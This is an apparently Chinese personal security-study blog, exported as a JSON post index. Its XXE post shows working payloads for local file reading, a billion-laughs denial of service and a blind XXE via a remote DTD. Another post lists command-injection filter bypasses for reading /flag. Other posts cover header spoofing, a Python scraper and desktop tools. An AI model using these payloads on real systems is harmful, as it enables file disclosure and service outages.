[{"title":"Hello World","url":"/2024/02/10/hello-world/","content":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub.\nQuick StartCreate a new post$ hexo new &quot;My New Post&quot;\n\nMore info: Writing\nRun server$ hexo server\n\nMore info: Server\nGenerate static files$ hexo generate\n\nMore info: Generating\nDeploy to remote sites$ hexo deploy\n\nMore info: Deployment\n"},{"title":"XXE攻击","url":"/2024/02/10/XXE%E6%94%BB%E5%87%BB/","content":"XML实体允许定义标记，这些标记将在解析XML文档时被内容替换。一般来说，实体有三种类型:\n\n内部实体\n外部实体\n参数实体\n\n实体必须在文档类型定义(DTD)中创建，让我们从一个例子开始\n&lt;?xml version=&quot;1.0&quot; standalone=&quot;yes&quot; ?&gt;&lt;!DOCTYPE blog [  &lt;!ELEMENT author (#PCDATA)&gt;  &lt;!ENTITY js &quot;Jo Smith&quot;&gt;]&gt;&lt;blog&gt;&lt;author&gt;&amp;js;&lt;/author&gt;&lt;/blog&gt;\n\n会被解析为\n&lt;blog&gt;&lt;author&gt;Jo Smith&lt;/author&gt;&lt;/blog&gt;\n\n信息泄露示例&lt;?xml version=&quot;1.0&quot; ?&gt;&lt;!DOCTYPE user [&lt;!ENTITY root SYSTEM &quot;file:///&quot;&gt; ]&gt;&lt;comment&gt;&lt;text&gt;&amp;root;&lt;/text&gt;&lt;/comment&gt;\n可以将根目录/下的内容读取出来\n拒绝服务示例&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE lolz [ &lt;!ENTITY lol &quot;lol&quot;&gt; &lt;!ELEMENT lolz (#PCDATA)&gt; &lt;!ENTITY lol1 &quot;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&quot;&gt; &lt;!ENTITY lol2 &quot;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&quot;&gt; &lt;!ENTITY lol3 &quot;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&quot;&gt; &lt;!ENTITY lol4 &quot;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&quot;&gt; &lt;!ENTITY lol5 &quot;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&quot;&gt; &lt;!ENTITY lol6 &quot;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&quot;&gt; &lt;!ENTITY lol7 &quot;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&quot;&gt; &lt;!ENTITY lol8 &quot;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&quot;&gt; &lt;!ENTITY lol9 &quot;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&quot;&gt;]&gt;&lt;lolz&gt;&amp;lol9;&lt;/lolz&gt;\n使用相同的XXE攻击，可以对服务器进行DOS服务攻击。当XML解析器加载这个文档时，它看到包含根元素lolz，其中包含文本&lol9;。然而，&lol9;是一个已定义的实体，它可以扩展为包含十个&lol8;的字符串。每个&lol8;字符串都是一个已定义的实体，可以扩展为十个&lol7;字符串，以此类推。在处理所有实体扩展之后，这个小块&lt; 1 KB的XML实际上将占用几乎3 GB的内存。\nBlind XXE&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!ENTITY ping SYSTEM &#x27;file://home/webgoat/.webgoat-8.2.2//XXE/secret.txt&#x27;&gt;\n在服务器中托管该DTD文件，并拦截携带XML的请求，修改请求内容，使其远程调用文件。\n&lt;?xml version=&quot;1.0&quot;?&gt;&lt;comment&gt;&lt;text&gt;cute&lt;/text&gt;&lt;/comment&gt;\n\n修改为\n&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE test [&lt;!ENTITY % command SYSTEM &quot;http://127.0.0.1:9090/files/sonder/attack.dtd&quot;&gt;%command;]&gt;&lt;comment&gt;&lt;text&gt;cute &amp;ping;&lt;/text&gt;&lt;/comment&gt;","categories":["Web"]},{"title":"绕过手法","url":"/2024/02/10/%E7%BB%95%E8%BF%87%E6%89%8B%E6%B3%95/","content":"示例：cat /flag\n空格绕过\n制表符%09，cat%09/flag\n&lt;, cat&lt;/flag, ;cat%3C/flag\n{}, &#123;cat,/flag&#125;\n${IFS}, cat$&#123;IFS&#125;/flag\n$IFS$9, cat$IFS$9/flag同一种绕过方法可能小概率会因为linux系统版本不同失效\n\n过滤关键字，例如cat\n拼接绕过，a=ca;b=t;$a$b /flag\n命令替换绕过，more:一页一页的显示文件内容, more /flagless:与 more 类似，less /flaghead:查看头几行 head /flagtac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示 tac /flagtail:查看尾几行 tail /flagnl：显示的时候，顺便输出行号 nl /flagod:以二进制的方式读取档案内容 od /flag,有些问题没有解决vi:编辑器命令vim:编辑器命令sort: 排序命令，可以查看 sort /flaguniq: 可以查看 uniq /flagfile -f:报错出具体内容sh &#x2F;flag 2&gt;%261 &#x2F;&#x2F;报错出文件内容\n\n过滤目标文件使用通配符 ?, *代替\n","categories":["Web"]},{"title":"HTTP请求","url":"/2024/02/10/HTTP%E8%AF%B7%E6%B1%82/","content":"教程https://www.bookstack.cn/read/http-study\n客户端的真实 IP 地址可以用例如X-Forwarded-For: 127.0.0.1来设置HTTP请求的标头来告诉服务器自己是从本地访问的\n\nX-Forwarded-For: 这个 HTTP 头部字段用于识别通过 HTTP 代理或负载均衡器连接到 web 服务器的客户端的原始 IP 地址。当流量通过代理或负载均衡器时，这些设备会在 HTTP 头部添加 X-Forwarded-For 字段，值为原始客户端的 IP 地址。\n\nX-Real-IP: 这个 HTTP 头部字段也用于识别客户端的原始 IP 地址。它通常用于在代理服务器后面的应用服务器上，以获取客户端的真实 IP 地址。\n\nX-Client-IP: 这个 HTTP 头部字段的用途和 X-Forwarded-For 以及 X-Real-IP 类似，也是用于识别客户端的原始 IP 地址。不过，它不如前两者常见。\n\nClient-IP: 这个 HTTP 头部字段的用途和上述三者类似，也是用于识别客户端的原始 IP 地址。它的使用频率也相对较低。\n\n\n这些头部字段的主要目的是在客户端和服务器之间的连接经过代理或负载均衡器时，能够在服务器端获取到客户端的真实 IP 地址。\n\n可以用例如Referer: http://www.example.com/index.html来设置HTTP请求的标头来告诉服务器自己是来自www.example.com的index.html页面\n请求来源\nOrigin: 这个头部字段用于标识请求的来源，但它只包含协议、主机和端口号，不包含路径或查询参数。它主要用于跨站请求伪造（CSRF）防护。\n\nX-Requested-With: 这个头部字段用于标识 Ajax 请求。它的值通常为 XMLHttpRequest。\n\nReferer: 这个头部字段表示请求来源的 URL。当你从一个页面点击链接到另一个页面时，原始页面的 URL 就会被包含在 Referer 头部字段中。这对于跟踪用户是如何到达当前页面的非常有用。\n\n\n客户端软件类型可以用例如User-Agent: Chrome来设置HTTP请求的标头来告诉服务器发出请求的客户端是Chrome\nUser-Agent是一个 HTTP 头部字段，它描述了发出请求的客户端的软件类型和版本。\n\n代理服务器可以用例如Via: 1.0 gw.example.com(Squid/3.1)来设置HTTP请求的标头来告诉服务器发出请求经过了代理服务器gw.example.com。\n行头的1.0是指接受请求的服务器上应用的HTTP版本协议。接下来经过，若果存在更多的代理服务器亦是如此，在 Via 首部附加服务器信息，也可增加 1 个新的 Via 首部写入服务器信息。\nSquid/3.1表示代理服务器的类型和版本，这里是 Squid 3.1。\nVia 是一个 HTTP通用首部字段，不仅仅是请求，用于追踪请求和响应在代理服务器之间的转发。每经过一个代理服务器，就会在 Via 字段中添加该代理服务器的信息。\n但是，这些头部字段的使用取决于服务器的配置。并非所有的服务器都会检查这些头部。如果服务器没有被配置为检查这些头部，那么添加这些头部将没有任何效果。同时，由于这些头部字段可以被任意设置，因此并不能100%保证提供的信息就是客户端的真实信息。\n","categories":["HTTP"]},{"title":"python爬虫","url":"/2024/02/10/python%E7%88%AC%E8%99%AB/","content":"介绍requests 和 lxml 是 Python 中非常流行的两个库，主要用于网络请求和 XML&#x2F;HTML 的解析。\n\nrequests：用于发送 HTTP 请求的库，使 HTTP 请求变得简单易用。使用 requests 发送各种类型的 HTTP 请求（如 GET、POST、DELETE 等），并处理返回的响应。requests 支持自定义 headers、参数、cookies，以及处理重定向、超时等。\nimport requestsresponse = requests.get(&#x27;https://www.example.com&#x27;)print(response.status_code)print(response.text)\n\nlxml：用于解析 XML 和 HTML 的库，使用 lxml 来解析、查询和操作 XML 和 HTML 文档。\nfrom lxml import etreehtml = &quot;&quot;&quot;&lt;html&gt;  &lt;head&gt;&lt;title&gt;Example&lt;/title&gt;&lt;/head&gt;  &lt;body&gt;    &lt;p&gt;Hello, world!&lt;/p&gt;  &lt;/body&gt;&lt;/html&gt;&quot;&quot;&quot;tree = etree.fromstring(html)print(tree.findtext(&#x27;.//p&#x27;))\n这两个库经常一起使用，特别是在网络爬虫和数据抓取的场景中。使用 requests 获取网页内容，然后使用 lxml 来解析和提取需要的数据。\n\n\n练习记录import requeststarget = &quot;http://www.spiderbuf.cn&quot;url = f&quot;&#123;target&#125;/s01&quot;html = requests.get(url).textprint(html)\n查看获取页面源码\nimport requeststarget = &quot;http://www.spiderbuf.cn&quot;url = f&quot;&#123;target&#125;/s01&quot;html = requests.get(url).textf = open(&#x27;S01.html&#x27;, &#x27;w&#x27;, encoding=&#x27;utf-8&#x27;)f.write(html)f.close()print(html)\n将页面源码保存到本地，防止被封，可以在本地读取文件进行调试\nimport requestsfrom lxml import etreetarget = &quot;http://www.spiderbuf.cn&quot;url = f&quot;&#123;target&#125;/s01&quot;html = requests.get(url).textf = open(&#x27;S01.html&#x27;, &#x27;w&#x27;, encoding=&#x27;utf-8&#x27;)f.write(html)f.close()root = etree.HTML(html)trs = root.xpath(&#x27;//tr&#x27;)print(trs)\n通过xpath获取&lt;tr&gt;元素的列表\nimport requestsfrom lxml import etreetarget = &quot;http://www.spiderbuf.cn&quot;url = f&quot;&#123;target&#125;/s01&quot;html = requests.get(url).textf = open(&#x27;S01.html&#x27;, &#x27;w&#x27;, encoding=&#x27;utf-8&#x27;)f.write(html)f.close()root = etree.HTML(html)trs = root.xpath(&#x27;//tr&#x27;)for tr in trs:    print(tr.xpath(&#x27;./td&#x27;))\n通过xpath获取每个tr的td列表\nimport requestsfrom lxml import etreetarget = &quot;http://www.spiderbuf.cn&quot;url = f&quot;&#123;target&#125;/s01&quot;html = requests.get(url).textf = open(&#x27;S01.html&#x27;, &#x27;w&#x27;, encoding=&#x27;utf-8&#x27;)f.write(html)f.close()root = etree.HTML(html)trs = root.xpath(&#x27;//tr&#x27;)for tr in trs:    tds = tr.xpath(&#x27;./td&#x27;)    for td in tds:        print(td.text)        \n将td列表打印出来\nimport requestsfrom lxml import etreetarget = &quot;http://www.spiderbuf.cn&quot;url = f&quot;&#123;target&#125;/s01&quot;html = requests.get(url).textf = open(&#x27;S01.html&#x27;, &#x27;w&#x27;, encoding=&#x27;utf-8&#x27;)f.write(html)f.close()root = etree.HTML(html)trs = root.xpath(&#x27;//tr&#x27;)for tr in trs:    tds = tr.xpath(&#x27;./td&#x27;)    s = &#x27;&#x27;    for td in tds:        s = s + td.text + &#x27;|&#x27;    print(s)\n格式化输出td的信息，利用空串拼接，但td列表存在空数据，利用str()显式转换去处理。\nTraceback (most recent call last):  File &quot;D:\\PyBatch\\cyber\\S01.py&quot;, line 19, in &lt;module&gt;    s = s + td.text + &#x27;|&#x27;TypeError: can only concatenate str (not &quot;NoneType&quot;) to str\n\nimport requestsfrom lxml import etreetarget = &quot;http://www.spiderbuf.cn&quot;url = f&quot;&#123;target&#125;/s01&quot;html = requests.get(url).textf = open(&#x27;S01.html&#x27;, &#x27;w&#x27;, encoding=&#x27;utf-8&#x27;)f.write(html)f.close()root = etree.HTML(html)trs = root.xpath(&#x27;//tr&#x27;)for tr in trs:    tds = tr.xpath(&#x27;./td&#x27;)    s = &#x27;&#x27;    for td in tds:        s = s + str(td.text) + &#x27;|&#x27;    print(s)\nimport requestsfrom lxml import etreetarget = &quot;http://www.spiderbuf.cn&quot;url = f&quot;&#123;target&#125;/s01&quot;html = requests.get(url).textf = open(&#x27;S01.html&#x27;, &#x27;w&#x27;, encoding=&#x27;utf-8&#x27;)f.write(html)f.close()f = open(&#x27;datas01.txt&#x27;, &#x27;w&#x27;, encoding=&#x27;utf-8&#x27;)root = etree.HTML(html)trs = root.xpath(&#x27;//tr&#x27;)for tr in trs:    tds = tr.xpath(&#x27;./td&#x27;)    s = &#x27;&#x27;    for td in tds:        s = s + str(td.text) + &#x27;|&#x27;    print(s)    if s != &#x27;&#x27;:        f.write(s + &#x27;\\n&#x27;)f.close()\n将获取的数据存入到本地\n","categories":["python"]},{"title":"Web技能树","url":"/2024/02/10/Web%E6%8A%80%E8%83%BD%E6%A0%91/","content":"SQL注入漏洞01-数字型注入 ♾️\n02-字符型注入\n03-bool注入 ♾️\n04-sleep注入\n05-updatexml注入\n06-宽字节注入\n07-空格过滤绕过\n08-大小写过滤绕过\n09-双写关键字绕过\n10-双重url编码绕过\n11-十六进制绕过\n12-等价函数替换过滤绕过\n13-二次注入\n14-布尔盲注 ♾️\n15-sql文件上传\n文件上传漏洞01-前端JS过滤绕过\n02-文件名过滤绕过\n03-Content-Type过滤绕过 ♾️\n04-文件头过滤绕过\n05-.htaccess文件上传\n06-文件截断上传\n07-竞争条件文件上传\n文件包含漏洞01-本地文件包含\n02-本地文件包含绕过\n03-session本地文件包含\n04-远程文件包含\n05-远程文件包含绕过\n06-php:&#x2F;&#x2F;filter伪协议\n07-php:&#x2F;&#x2F;input伪协议\n08-php:&#x2F;&#x2F;input伪协议利用\n09-file:&#x2F;&#x2F;伪协议利用\n10-data:&#x2F;&#x2F;伪协议利用\n命令执行漏洞01-命令执行漏洞\n02-命令执行漏洞空格绕过 ♾️\n03-命令执行漏洞关键命令绕过 ♾️\n04-命令执行漏洞通配符绕过 ♾️\n05-命令执行漏洞base64编码绕过 ♾️\n代码执行漏洞01-eval函数示例 ♾️\n02-assert函数示例 ♾️\n03-call_user_func函数示例 ♾️\n04-call_user_func_array函数示例\n05-create_function函数示例 ♾️\n06-array_map函数示例 ♾️\n07-preg_replace无漏洞函数示例\n08-preg_replace漏洞函数示例 ♾️\n09-可变函数漏洞示例01 ♾️\n10-可变函数漏洞示例02\nXSS 漏洞01-反射型XSS漏洞\n02-存储型XSS漏洞\n03-DOM XSS漏洞\n04-XSS修复示例\nSSRF漏洞01-SSRF漏洞文件读取\n02-SSRF漏洞内网探测\n03-SSRF漏洞内网应用攻击\nXXE漏洞01-XXE漏洞文件读取 ♾️\n02-XXE漏洞内网探测\n03-XXE漏洞内网应用攻击\n反序列化漏洞01-反序列化漏洞示例01\n02-反序列化漏洞示例02\n中间件漏洞01-Weblogic中间件漏洞\n02-Tomcat中间件漏洞\n03-Jboss中间件漏洞\n解析漏洞01-Apache解析漏洞\n02-Nginx解析漏洞\n数据库漏洞01-MySQL数据库漏洞\n02-Redis数据库漏洞\n","categories":["Web"]},{"title":"软件美化","url":"/2024/02/10/%E8%BD%AF%E4%BB%B6%E7%BE%8E%E5%8C%96/","content":"教程B站合辑：https://space.bilibili.com/24419705/channel/collectiondetail?sid=773639\n不卡用着不舒服\n\nlivewallpaper 动态壁纸github项目地址：https://github.com/rocksdanister/lively\n网站地址：https://www.rocksdanister.com/lively\n动态壁纸：\n\n星耀动漫女孩：https://zhutix.com/animated/glowing-star-girl\n灵魂潮汐-星见亚砂 私语：https://livewallpaper.giantapp.cn/wallpapers/info/b751f28065aea20d08277836324c7c74\n池塘女孩：https://zhutix.com/animated/anime-girl-on-a-pond\n崩坏3 迷城骇兔：https://zhutix.com/animated/bronya-haxxor-bunny\n雷电将军-绊https：&#x2F;&#x2F;zhutix.com&#x2F;animated&#x2F;beelzebul-lei\n逆神巫女 八重樱：https://zhutix.com/animated/yae-sakura-dt\n从零开始的异世界生活 雷姆：https://zhutix.com/animated/anime-bride\n伊蕾娜：https://livewallpaper.giantapp.cn/wallpapers/info/def1da456532be1607e9a5467a275e23\n崩坏3 御三家：https://livewallpaper.giantapp.cn/wallpapers/info/dd304a206592225f0027480e09f1e007\n蔚蓝档案 诺亚https://livewallpaper.giantapp.cn/wallpapers/info/a72823ff659141930574b8ba7868b562\n\n\nRoundedTB | 任务栏美化github项目地址：https://githubfast.com/RoundedTB\n\nTranslucentTB | 透明任务栏github项目地址：https://github.com/TranslucentTB/TranslucentTB\n可在微软商店下载\n\nRainmeter | Windows桌面自定义工具github项目地址：https://github.com/rainmeter/rainmeter\n网站地址：https://www.rainmeter.net/\n皮肤simple-clean：https://zhutix.com/skins/simple-clean，\n主要是使用Visualizer组件，音乐可视化\n\nBetterNCM | 网易云自定义皮肤github项目地址：https://github.com/MicroCBer/BetterNCM\n网站地址：https://microblock.cc/betterncm\n用户文档：https://v2e2npdz15.feishu.cn/docx/UZkSd9d46o4fVOxaPNBcGXSenme\n已安装插件：\n\nBGEnhanced 自定义网易云背景!(需安装任意主题) –MicroBlock\nMoTheme 主题插件，用于美化网易云音乐 (更换背景使用BGEnhanced插件，换颜色使用明&#x2F;暗主题切换器插件) – 沫烬染\nMikuPlugin (点左侧插件管理使用)精简易云音乐，关闭任何组件，修改字体与颜色 –小岩喵\t\nDowngradeOK 降级网易云至 2.10.12，并干掉自动更新 –MicroBlock\n\n\nnotepads | 记事本github项目地址：https://githubfast.com/0x7c13/Notepads\n微软商店可下载\n\n鼠标指针\n原神 七星之玉衡 刻晴：https://zhutix.com/ico/keqing-cuu/\n\n\nkeyviz | 按键可视化github项目地址：https://github.com/mulaRahul/keyviz\n带不起emm，直接一手卡退\n\ncarnac | 按键可视化github项目地址：https://github.com/Code52/carnac\n","categories":["美化"]}]